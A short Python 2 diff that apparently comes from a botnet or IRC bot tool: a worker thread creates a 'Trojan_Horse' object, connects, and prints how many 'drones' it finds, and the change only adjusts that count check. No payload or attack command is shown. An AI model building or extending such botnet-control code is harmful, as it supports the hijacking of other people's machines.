@@ -34,7 +34,7 @@ class WesBos(threading.Thread):
             # process file
             irc_bot = bot.Trojan_Horse(botnet)
             botnet_size = irc_bot.connect()
-            if len(botnet_size) > 0:
+            if botnet_size or len(botnet_size) > 0:
                 print "We found %s drones in a botnet!" % len(botnet_size)
             # signals to queue job is done
             self.botnet_queue.task_done()
